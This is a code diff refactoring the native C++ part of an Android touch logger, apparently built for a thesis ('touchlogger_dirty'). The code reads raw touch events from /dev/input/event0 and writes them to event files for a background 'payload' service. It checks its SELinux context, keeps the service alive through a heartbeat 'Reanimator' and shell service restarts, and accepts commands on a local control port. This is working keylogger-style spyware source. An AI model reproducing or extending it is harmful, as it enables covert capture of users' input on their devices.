@@ -2,17 +2,19 @@
 // Created by kirill on 17.03.17.
 //
 
-#include <string.h>
-#include <errno.h>
+#include <cstring>
+#include <cerrno>
+#include <sstream>
 #include <unistd.h>
 #include <dirent.h>
 #include <dlfcn.h>
-#include <stdlib.h>
+#include <cstdlib>
 #include <fcntl.h>
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <utils/Utils.h>
-#include "dirty/common/logging.h"
+#include <EventFileWriter.h>
+#include "common/logging.h"
 #include "input_device/InputReader.h"
 #include "ControlReader.h"
 #include "utils/Reanimator.h"
@@ -20,17 +22,17 @@
 typedef int getcon_t(char** con);
 
 // TODO: figure out how to get this info from CMake script and pass it here
-#define PKNAME                  "org.leyfer.thesis.touchlogger_dirty"
-#define SERVICE_PROCESS_NAME    "touchlogger.here"
-#define SERVICE                 ".service.PayloadWaitingService"
-#define ACTION                  "org.leyfer.thesis.touchlogger_dirty.service.action.WAIT_FOR_PAYLOAD"
-#define CONTROL_PORT            10500
-#define HEARTBEAT_INTERVAL_US   1000 * 1000  // 1000 secs
+constexpr auto packageName = "org.leyfer.thesis.touchlogger_dirty";
+constexpr auto SERVICE_PROCESS_NAME = "touchlogger.here";
+constexpr auto SERVICE = ".service.PayloadWaitingService";
+constexpr auto ACTION = "org.leyfer.thesis.touchlogger_dirty.service.action.WAIT_FOR_PAYLOAD";
+constexpr auto CONTROL_PORT = 1050;
+constexpr auto HEARTBEAT_INTERVAL_US = (1000 * 1000);  // 1000 secs
 
-#define SELINUX_PATH "/sys/fs/selinux/"
-static const std::string heartbeatCommand = "heartbeat\n";
-static const std::string pauseCommand = "pause\n";
-static const std::string resumeCommand = "resume\n";
+constexpr auto SELINUX_PATH = "/sys/fs/selinux/";
+const std::string heartbeatCommand = "heartbeat\n";
+const std::string pauseCommand = "pause\n";
+const std::string resumeCommand = "resume\n";
 
 InputReader* inputReader;
 
@@ -39,7 +41,7 @@ Reanimator* reanimator;
 int isServiceProcessActive()
 {
   DIR* dir = opendir("/proc");
-  if (dir == NULL)
+  if (dir == nullptr)
   {
     LOGV("Couldn't open /proc");
     return -1;
@@ -47,7 +49,9 @@ int isServiceProcessActive()
 
   struct dirent* de;
   char cmdline_path[PATH_MAX];
-  char buf[128];
+
+  const int bufSize = 128;
+  char buf[bufSize];
 
   bool found = false;
 
@@ -76,8 +80,8 @@ int isServiceProcessActive()
       continue;
     }
 
-    memset(buf, 0, 128);
-    if (read(fd, buf, 128) == -1)
+    memset(buf, 0, bufSize);
+    if (read(fd, buf, bufSize) == -1)
     {
       LOGV("Unable to read from %s: %s!", cmdline_path, strerror(errno));
       close(fd);
@@ -111,7 +115,7 @@ int isServiceProcessActive()
 
 bool has_selinux()
 {
-  struct stat st;
+  struct stat st{};
   if (stat(SELINUX_PATH, &st) == -1)
   {
     LOGV("No selinux.");
@@ -147,7 +151,7 @@ int getSelinuxContext(char** context)
     }
     else
     {
-      getcon_t* getcon_p = (getcon_t*) getcon;
+      auto* getcon_p = (getcon_t*) getcon;
       int res = (*getcon_p)(context);
       dlclose(selinux);
       return res;
@@ -165,7 +169,7 @@ int getSelinuxContext(char** context)
 
 int checkConditions()
 {
-  int fd = open("/dev/input/event0", O_RDONLY);
+  int fd = open("/dev/input/event0", O_RDONLY | O_CLOEXEC);
   if (fd == -1)
   {
     LOGV("Unable to get access to input device: %s!", strerror(errno));
@@ -177,7 +181,7 @@ int checkConditions()
     close(fd);
   }
 
-  struct stat st;
+  struct stat st{};
   if (stat("/sdcard/", &st) == -1)
   {
     LOGV("Unable to access SD card: %s!", strerror(errno));
@@ -191,9 +195,9 @@ int checkConditions()
   return 0;
 }
 
-int startServceAndWaitForItToBecomeOnline()
+int startServiceAndWaitForItToBecomeOnline()
 {
-  while (1)
+  while (true)
   {
     if (isServiceProcessActive() == 0)
     {
@@ -203,7 +207,9 @@ int startServceAndWaitForItToBecomeOnline()
     else
     {
       LOGV("No touchlogger process!");
-      system("am startservice -n " PKNAME "/" SERVICE " -a " ACTION);
+      auto commandStream = std::stringstream();
+      commandStream << "am startservice -n " << packageName << "/" << SERVICE << " -a " << ACTION;
+      system(commandStream.str().c_str());
       sleep(1);
     }
   }
@@ -284,10 +290,10 @@ int main(int argc, const char** argv)
   callbackMap.emplace(pauseCommand, &onPause);
   callbackMap.emplace(resumeCommand, &onResume);
   callbackMap.emplace(heartbeatCommand, &onHeartBeat);
-  ControlReader* controlReader = new ControlReader(CONTROL_PORT, callbackMap);
+  auto* controlReader = new ControlReader(CONTROL_PORT, callbackMap);
   controlReader->start();
 
-  if (startServceAndWaitForItToBecomeOnline() == -1)
+  if (startServiceAndWaitForItToBecomeOnline() == -1)
   {
     LOGV("Unable to wait for Android service, exiting...");
     return -1;
@@ -301,11 +307,11 @@ int main(int argc, const char** argv)
   }
 
   LOGV("Starting reanimator...");
-  reanimator = new Reanimator(HEARTBEAT_INTERVAL_US, startServceAndWaitForItToBecomeOnline);
+  reanimator = new Reanimator(HEARTBEAT_INTERVAL_US, startServiceAndWaitForItToBecomeOnline);
   reanimator->start();
 
   LOGV("Collecting input data & sending it to Android service...");
-  EventFileWriter* eventFileWriter = new EventFileWriter(EVENT_DATA_DIR);
+  auto* eventFileWriter = new EventFileWriter(EVENT_DATA_DIR);
   inputReader = new InputReader(eventFileWriter, inputDevice);
   inputReader->start();
 
